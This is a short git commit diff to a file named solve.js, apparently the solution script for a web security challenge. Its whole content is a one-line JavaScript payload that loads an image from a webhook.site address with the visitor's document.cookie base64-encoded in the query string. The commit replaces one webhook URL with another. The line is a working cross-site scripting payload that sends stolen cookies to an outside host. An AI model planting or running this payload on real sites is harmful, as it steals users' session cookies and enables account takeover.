288004ca5abce837af95b56ebc49e298e1cc018c
Nathan <131342646+Arximos@users.noreply.github.com>
2025-01-10 13:40:53 +0300

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/2fb41108-8f3e-4492-94d4-9b9b962eaa30?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/b0a9cbc8-4d1e-4ca2-9cb1-c64c4da898bd?data='+btoa(document.cookie);
